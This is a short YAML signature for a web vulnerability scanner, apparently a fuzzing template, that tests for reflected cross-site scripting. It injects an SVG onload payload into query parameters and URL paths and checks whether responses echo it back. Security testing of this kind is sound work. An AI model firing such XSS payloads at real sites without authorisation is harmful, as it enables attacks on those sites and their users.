# info to search signature
id: fuzz-XSS
type: fuzz
info:
  name: XSS Fuzz
  risk: High

# origin: gonna come from Burp
payloads:
    - 'xssHere<svg onload=confirm`1`>'
    
requests:
  - generators:
      # Change exist content type or adding new one
      - Query("{{.payload}}")
      - Path("{{.payload}}", "*")
    detections:
      - >-
        StringSearch("response", "xssHere<svg onload=confirm`1`>")
